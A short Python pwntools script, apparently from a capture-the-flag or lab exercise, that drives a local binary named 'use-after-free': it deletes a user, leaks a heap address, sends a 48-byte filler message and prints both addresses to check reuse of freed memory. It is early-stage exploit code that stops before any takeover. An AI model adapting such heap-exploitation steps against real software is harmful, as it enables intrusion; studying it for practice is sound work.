from pwn import *

target = "use-after-free"

p = process(target)

payload = b"a"*48

p.recvuntil(">>>")
p.sendline("delete-user")
p.recvuntil(':')
p.sendline("Kim")
del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
p.sendline("msg")
print(p.recvuntil(":"))
p.sendline(payload)
msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
print(del_addr, msg_addr)